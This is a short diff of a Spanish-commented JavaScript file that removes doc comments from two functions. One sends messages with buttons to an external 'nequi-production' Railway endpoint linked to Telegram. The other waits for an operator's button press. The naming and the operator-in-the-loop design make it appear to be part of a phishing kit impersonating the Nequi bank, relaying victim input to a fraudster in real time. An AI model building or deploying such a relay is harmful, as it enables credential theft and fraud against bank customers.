@@ -1,13 +1,7 @@
 // ================================================================
-// js/sendTelegramMessage.js - ARCHIVO COMPLETO Y CORREGIDO
+// js/sendTelegramMessage.js
 // ================================================================
 
-/**
- * Envía un mensaje a Telegram con botones interactivos
- * @param {string} mensaje - El texto del mensaje a enviar
- * @param {string} teclado - JSON stringificado con los botones (inline_keyboard)
- * @returns {Promise<Object>} - Respuesta del servidor con message_id
- */
 async function sendTelegramMessageWithBtn(mensaje, teclado) {
   const url = "https://nequi-production.up.railway.app/send-message";
   
@@ -47,12 +41,6 @@ async function sendTelegramMessageWithBtn(mensaje, teclado) {
   }
 }
 
-/**
- * Espera a que el operador presione un botón en Telegram
- * @param {number} messageId - ID del mensaje enviado
- * @param {number} timeout - Tiempo máximo de espera en segundos (default: 120)
- * @returns {Promise<Object>} - Objeto con la acción seleccionada
- */
 async function waitForButtonPress(messageId, timeout = 120) {
   const url = "https://nequi-production.up.railway.app/wait-action";
   
